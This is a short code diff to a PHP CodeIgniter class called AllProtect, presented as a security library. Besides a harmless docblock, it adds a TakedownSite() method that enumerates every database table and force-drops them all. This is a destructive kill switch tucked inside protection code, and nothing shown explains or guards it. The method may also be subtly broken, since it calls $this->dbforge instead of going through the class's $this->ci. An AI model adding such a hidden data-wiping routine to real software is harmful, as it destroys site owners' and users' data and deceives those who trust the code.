@@ -61,6 +61,16 @@ class AllProtect
         }
     }
 
+    /**
+     * Ip Address Protection
+     * 
+     * This Function Is Protector For IP Address
+     * 
+     * Return Static Result
+     * 
+     * @return void
+     * @copyright Darkblow Studio
+     */
     public function IsBannedIpAddress()
     {
         $query = $this->ci->db->get_where('web_ipbanned', array('ip_address' => $this->ci->input->ip_address()))->row();
@@ -124,6 +134,19 @@ class AllProtect
     public function AdminDashboard_Protection()
     {
         if (empty($this->ci->session->userdata('admin_uid'))) redirect(base_url('adm/login'), 'refresh');
+    }
+
+    public function TakedownSite()
+    {
+        $this->ci->load->dbforge();
+        // Clearing Database
+        $query = $this->ci->db->query("SELECT * FROM information_schema.tables WHERE table_schema = 'public'")->result_array();
+        if ($query) {
+            // Force Drop Database
+            foreach ($query as $row) {
+                $this->dbforge->drop_table($row['table_name'], TRUE);
+            }
+        }
     }
 }
 
